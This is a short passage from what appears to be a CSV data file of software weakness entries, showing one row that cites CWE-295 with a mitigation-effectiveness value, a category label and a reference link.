-Effectiveness: High",11. Other,,25,,,,,https://cwe.mitre.org/data/definitions/295.html,295,,,TRUE,
